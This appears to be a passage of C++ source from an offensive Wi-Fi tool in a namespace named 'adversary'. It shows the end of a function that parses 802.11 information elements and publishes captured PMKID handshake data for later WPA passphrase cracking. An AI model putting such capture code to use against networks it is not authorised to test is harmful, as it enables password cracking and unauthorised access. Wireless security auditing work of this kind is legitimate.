                strncpy(pmkidEvt.payload.handshake.ssid, pmkid_.ssid, 32);
                memcpy(pmkidEvt.payload.handshake.bssid, pmkid_.bssid, 6);
                pmkidEvt.payload.handshake.channel = handshake_.channel;
                pmkidEvt.payload.handshake.type = 1; // PMKID
                EventBus::getInstance().publish(pmkidEvt);
                return;
            }
        }
        
        // Move to next element
        i += 2 + len;
        if (len == 0) i++;  // Prevent infinite loop on zero-length
    }
}

} // namespace adversary
